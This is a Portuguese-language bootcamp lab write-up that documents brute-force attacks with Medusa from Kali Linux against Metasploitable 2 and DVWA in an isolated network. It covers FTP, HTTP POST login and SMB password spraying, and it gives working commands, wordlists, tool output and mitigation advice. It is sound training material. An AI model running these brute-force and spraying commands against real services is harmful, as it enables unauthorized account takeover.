# 🛡️🔐 Projeto: Ataques de Força Bruta com Medusa + Kali Linux

Bootcamp ciberseguraça Santander – DIO / 2025 - Instrutora: Isadora Ferrão 

Feito com 💖 por **Isis Lavor**. repostado as foto são de kennedy anderson

---

## 📌 Descrição Geral

Este projeto demonstra, em ambiente controlado, como funcionam ataques de força bruta utilizando a ferramenta **Medusa** no Kali Linux, visando compreender riscos reais e práticas de defesa.

### Simulei ataques contra:

- FTP (Metasploitable 2)
- Login Web (DVWA) via automação
- Senha SMB (Samba) usando password spraying

O foco é estudo e documentação, seguindo boas práticas de Ethical Hacking e Pentest. 🔐

---

## 1. Arquitetura do ambiente

<img width="706" src="https://github.com/user-attachments/assets/2df31184-ecdd-40de-94b6-b41708e9ba70" />

| VM               | Sistema           | Função          | IP (exemplo)          |
| ---------------- | ----------------- | --------------- | ---------------------- |
| Kali Linux       | Kali 2024.3       | Atacante        | 192.168.56.10         |
| Metasploitable 2 | Ubuntu Vulnerável | Alvo (FTP, SMB) | 192.168.56.103        |
| DVWA             | PHP/MySQL         | Alvo Web        | 192.168.56.103/dvwa   |

**Rede utilizada:** Host-only (VirtualBox)  
**Objetivo:** Isolar o ataque e garantir segurança total durante os testes.

---

## 2. Configuração do ambiente

Para realizar os testes de forma segura, montei um ambiente isolado utilizando o **VirtualBox** com duas máquinas virtuais.

### 🔧 2.1 Instalação do VirtualBox

Instalei o VirtualBox no host Linux, que serviu como plataforma para executar o Kali Linux (atacante) e o Metasploitable 2 (alvo).

### 🔧 2.2 Criação das máquinas virtuais

Foram criadas duas VMs:

- **Kali Linux 2024.3** — máquina atacante  
- **Metasploitable 2** — máquina vulnerável para testes FTP, SMB e DVWA  

Ambas configuradas com parâmetros padrão (CPU, RAM, disco).

### 🔧 2.3 Configuração de rede Host-Only

Configurei as duas VMs na rede **Host-Only**, garantindo:

- Comunicação direta entre Kali ↔ Metasploitable  
- Isolamento total do ambiente  
- Nenhuma exposição à rede real

### 🔍 2.4 Teste de comunicação

```bash
ping 192.168.56.103
```

Ambas as máquinas comunicaram-se corretamente, permitindo prosseguir com os ataques.

---

## 3. Enumeração inicial com Nmap

<img src="https://github.com/user-attachments/assets/943aa2f9-2f97-4476-999e-3f0b3eba955e" width="200">

A enumeração inicial permite descobrir serviços expostos no alvo. Utilizei o **Nmap** para identificar esses serviços.

### 🔧 3.1 Comando executado

```bash
nmap -sV -p 21,22,80,139,445 192.168.56.103
```

### 📊 3.2 Resultados Importantes

| Porta       | Estado | Serviço      | Versão Identificada                          |
| ----------- | ------ | ------------ | -------------------------------------------- |
| **21/tcp**  | open   | ftp          | vsftpd 2.3.4                                 |
| **22/tcp**  | open   | ssh          | OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0) |
| **80/tcp**  | open   | http         | Apache httpd 2.2.8 ((Ubuntu) DAV/2)          |
| **139/tcp** | open   | netbios-ssn  | Samba smbd 3.X – 4.X (WORKGROUP)             |
| **445/tcp** | open   | microsoft-ds | Samba smbd 3.X – 4.X (WORKGROUP)             |

**Informações adicionais:**

* Sistema Operacional Detectado: **Linux / Unix**
* MAC Address: **08:00:27:C6:60:F1** (VirtualBox Virtual NIC)

### 🧩 3.3 Análise dos Serviços Descobertos

* **FTP (vsftpd 2.3.4):** serviço vulnerável, ótimo alvo para brute force.
* **SSH (OpenSSH 4.7p1):** versão antiga, potencial para testes de autenticação.
* **HTTP (Apache 2.2.8):** hospeda DVWA, ideal para testes de brute force web.
* **SMB (Samba):** portas 139 e 445 expostas, alvo para password spraying.

---

## 4. Ataque de Força Bruta – FTP (Medusa)

<img src="https://www.kali.org/tools/medusa/images/medusa-logo.svg" width="200">

Após identificar o FTP ativo e vulnerável, iniciei o ataque de força bruta usando o **Medusa**.

### 🔍 4.1 Teste inicial de conexão FTP

```bash
ftp 192.168.56.103
```

Resultado:

```text
220 (vsFTPd 2.3.4)
Name: admin
331 Please specify the password.
530 Login incorrect.
```

O serviço FTP aceita conexão e está vulnerável a tentativas repetidas de login.

### 📝 4.2 Criação das wordlists

**users.txt**

```text
user
msfadmin
admin
root
```

**pass.txt**

```text
123456
password
qwerty
msfadmin
```

### 🚀 4.3 Execução do ataque com Medusa

```bash
medusa -h 192.168.56.103 -U users.txt -P pass.txt -M ftp -t 6
```

Onde:

* `-h`: host alvo
* `-U`: wordlist de usuários
* `-P`: wordlist de senhas
* `-M ftp`: módulo FTP
* `-t 6`: threads simultâneas

### 🎯 4.4 Resultado do ataque

```text
ACCOUNT FOUND: [ftp] Host: 192.168.56.103 User: msfadmin Password: msfadmin [SUCCESS]
```

Credencial válida encontrada:

* **Usuário:** `msfadmin`
* **Senha:** `msfadmin`

### 🔐 4.5 Validação manual

```bash
ftp 192.168.56.103
```

Entrada:

```text
Name: msfadmin
Password: msfadmin
```

Resultado:

```text
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
```

O acesso foi confirmado com sucesso.

### ✔️ 4.6 Conclusão da etapa FTP

* Serviço FTP vulnerável com credenciais fracas.
* O Medusa encontrou rapidamente usuário e senha válidos.
* A validação manual confirmou o comprometimento.
* Reflete a importância de políticas de senha fortes e desativação de serviços legados como o vsftpd 2.3.4.

---

## 5. Brute Force Web – DVWA (Medusa + HTTP POST)

<img src="https://github.com/user-attachments/assets/04ea0e90-07a0-4bc4-ae49-7340e8d7e531" width="200">

O DVWA (Damn Vulnerable Web Application) é um ambiente propositalmente vulnerável, ideal para simular ataques web.
Nesta etapa, utilizei o **Medusa** para automatizar tentativas de login via HTTP POST.

### 🔍 5.1 Identificando o formulário de login

Acesse:

```text
http://192.168.56.103/dvwa/login.php
```

Com o **DevTools → Network** do Firefox, observei:

* Requisição `POST` para `login.php`
* Parâmetros enviados:

```text
username=isis
password=123
Login=Login
```

### 🧩 5.2 Parâmetros relevantes

* Endpoint de autenticação: `/dvwa/login.php`
* Campos do formulário:

| Campo HTML | Função         |
| ---------- | -------------- |
| `username` | usuário        |
| `password` | senha          |
| `Login`    | botão de envio |

Essas informações foram usadas na configuração do Medusa.

### 📝 5.3 Wordlists utilizadas

Reaproveitei as mesmas listas:

**users.txt**

```text
user
msfadmin
admin
root
```

**pass.txt**

```text
123456
password
qwerty
msfadmin
```

### 🚀 5.4 Execução do ataque com Medusa (HTTP POST)

```bash
medusa -h 192.168.56.103 \
  -U users.txt -P pass.txt \
  -M http \
  -m PAGE:'/dvwa/login.php' \
  -m FORM:'username=USER&password=PASS&Login=Login' \
  -m 'FAIL=Login failed' \
  -t 6
```

Explicação:

* `-M http`: módulo HTTP
* `PAGE`: página que recebe o POST
* `FORM`: mapeamento dos campos de login
* `FAIL=Login failed`: texto que indica falha de autenticação
* `USER` / `PASS`: placeholders substituídos pelas wordlists

### 🎯 5.5 Resultado do ataque

Exemplos de credenciais válidas encontradas:

```text
ACCOUNT FOUND: [http] Host: 192.168.56.103 User: admin    Password: 123456  [SUCCESS]
ACCOUNT FOUND: [http] Host: 192.168.56.103 User: user     Password: password [SUCCESS]
ACCOUNT FOUND: [http] Host: 192.168.56.103 User: msfadmin Password: password [SUCCESS]
ACCOUNT FOUND: [http] Host: 192.168.56.103 User: user     Password: qwerty   [SUCCESS]
ACCOUNT FOUND: [http] Host: 192.168.56.103 User: root     Password: msfadmin [SUCCESS]
```

O DVWA aceita diversas combinações fracas, confirmando a vulnerabilidade do mecanismo de autenticação.

### 🔐 5.6 Validação visual

Após o ataque, realizei login com uma das credenciais válidas e obtive acesso à interface principal do DVWA:

* Acesso autorizado
* Menu lateral liberado
* Funcionalidades de vulnerabilidades disponíveis

### ✔️ 5.7 Conclusão da etapa DVWA

* O Medusa foi capaz de automatizar brute force HTTP com base em análise do tráfego.
* Diversas credenciais fracas foram encontradas.
* O uso do DevTools foi essencial para identificar endpoint e parâmetros corretos.
* Reforça a necessidade de proteções adicionais em formulários de login (rate limiting, CAPTCHA, MFA, bloqueio progressivo, senhas fortes).

---

## 6. Password Spraying – SMB (Samba)

O serviço SMB estava ativo nas portas **139** e **445**, conforme identificado pelo Nmap.
Para avaliá-lo, utilizei a técnica de **password spraying**, testando poucas senhas para vários usuários.

### 🔍 6.1 Enumeração de usuários via SMB

Utilizei o `enum4linux` para descobrir usuários conhecidos:

```bash
enum4linux -U 192.168.56.103
```

Saída típica no Metasploitable 2:

```text
[+] Enumerating users
user
msfadmin
nobody
root
```

Esses usuários foram usados na wordlist do ataque.

### 📝 6.2 Criação das wordlists

**users_smb.txt**

```text
user
msfadmin
root
nobody
```

**spray_passwords.txt**

```text
123456
password
qwerty
msfadmin
```

Listas pequenas ajudam a evitar muitas tentativas falhas por usuário.

### 🚀 6.3 Execução do ataque com Medusa (SMB)

```bash
medusa -h 192.168.56.103 -U users_smb.txt -P spray_passwords.txt -M smbnt -t 4
```

Onde:

* `-M smbnt`: módulo SMB
* Demais parâmetros seguem a mesma lógica usada nos outros ataques.

### 🎯 6.4 Resultado do ataque

Resultado esperado em ambiente como o Metasploitable 2:

```text
ACCOUNT FOUND: [smbnt] Host: 192.168.56.103 User: msfadmin Password: msfadmin [SUCCESS]
```

Mais uma vez, a credencial `msfadmin:msfadmin` aparece como válida.

### 🔐 6.5 Validação manual (opcional)

Um teste comum de validação seria:

```bash
smbclient -L 192.168.56.103 -U msfadmin
```

Entrada:

```text
Password: msfadmin
```

Saída típica:

```text
Sharename       Type      Comment
---------       ----      -------
tmp             Disk
msfadmin        Disk      Home directory
IPC$            IPC       IPC Service
```

### ✔️ 6.6 Conclusão da etapa SMB

* O enum4linux expôs usuários válidos.
* O password spraying encontrou credenciais reutilizadas entre serviços (FTP e SMB).
* A senha fraca `msfadmin` é compartilhada, ampliando o impacto do comprometimento.
* Reflete a importância de não reutilizar senhas e aplicar hardening no Samba.

---

## 7. Wordlists Utilizadas

As wordlists utilizadas foram simples e curtas, justamente para demonstrar como credenciais fracas podem ser descobertas rapidamente.

| Arquivo               | Uso principal  | Exemplo de conteúdo                        |
| --------------------- | -------------- | ------------------------------------------ |
| `users.txt`           | FTP / DVWA     | `user`, `msfadmin`, `admin`, `root`        |
| `pass.txt`            | FTP / DVWA     | `123456`, `password`, `qwerty`, `msfadmin` |
| `users_smb.txt`       | SMB            | `user`, `msfadmin`, `root`, `nobody`       |
| `spray_passwords.txt` | SMB (spraying) | `123456`, `password`, `qwerty`, `msfadmin` |

Essas listas estão no repositório para facilitar a reprodução dos testes.

---

## 8. Medidas de Mitigação

A partir dos testes realizados, algumas recomendações de mitigação se destacam:

### 🔐 Senhas e autenticação

* Exigir **senhas fortes** (tamanho mínimo, complexidade, expiração).
* Evitar reutilização de senhas entre diferentes serviços (FTP, SSH, SMB, aplicações web).
* Implementar **MFA** (autenticação multifator) sempre que possível.

### 🌐 Serviços e exposição

* Desabilitar serviços desnecessários (por exemplo, FTP em produção).
* Restringir SMB a redes internas e segmentadas.
* Manter softwares atualizados (vsftpd, Apache, Samba, etc.).

### 🚨 Proteções contra brute force

* Implementar **rate limiting** e bloqueio progressivo de contas.
* Configurar firewalls e IDS/IPS para detectar tentativas de brute force.
* Utilizar CAPTCHAs ou desafios adicionais em formulários web críticos.

### 🔎 Monitoramento e auditoria

* Registrar tentativas de login falhas e analisá-las regularmente.
* Realizar testes periódicos de segurança em ambiente controlado.

---

## 9. Evidências

As evidências dos testes (prints de tela) podem ser organizadas em uma estrutura como:

```text
/images
  /nmap
  /ftp_medusa
  /dvwa_bruteforce
  /smb_spraying
```

Os prints incluem:

* Saída do Nmap com serviços abertos.
* Consoles do Medusa durante os ataques (FTP, HTTP, SMB).
* DVWA antes e depois do login bem-sucedido.
* enum4linux listando usuários SMB.

Esses arquivos complementam a análise escrita e comprovam os resultados obtidos.

---

## 10. Reflexões e Aprendizados Pessoais

Este projeto permitiu:

* Consolidar o uso do **Kali Linux** em cenários de pentest controlado.
* Entender melhor como um atacante pode combinar **enumeração + brute force** para comprometer serviços.
* Perceber na prática o impacto de configurações fracas e senhas triviais.
* Refletir sobre a importância de documentar cada etapa: comandos, parâmetros, evidências e conclusões.

Mais do que “quebrar senhas”, o exercício reforçou a visão de que segurança é principalmente **gestão de riscos e boas práticas de configuração**.

---

## 11. Como Executar o Projeto

Passos gerais para reproduzir o ambiente:

1. **Clonar o repositório**

   ```bash
   git clone https://github.com/isislavor/projeto-medusa-bruteforce.git
   cd projeto-medusa-bruteforce
   ```

2. **Configurar o VirtualBox**

   * Criar VMs para **Kali Linux** e **Metasploitable 2**.
   * Configurar ambas em rede **Host-Only**.

3. **Iniciar o Metasploitable 2**

   * Verificar o IP (ex.: `192.168.56.103`).
   * Garantir que serviços FTP, HTTP, SMB estejam ativos.

4. **Iniciar o Kali Linux**

   * Testar conectividade com `ping 192.168.56.103`.
   * Confirmar presença das wordlists (`users.txt`, `pass.txt`, etc.).

5. **Executar as etapas**

   * Rodar o Nmap conforme descrito na seção 3.
   * Realizar o ataque FTP (seção 4).
   * Realizar o brute force DVWA (seção 5).
   * Executar o password spraying em SMB (seção 6).

6. **Analisar resultados**

   * Comparar as saídas com as tabelas deste README.
   * Avaliar quais controles mitigariam os problemas encontrados.

---

## 📄 Licença

Este projeto está licenciado sob a **MIT License**.
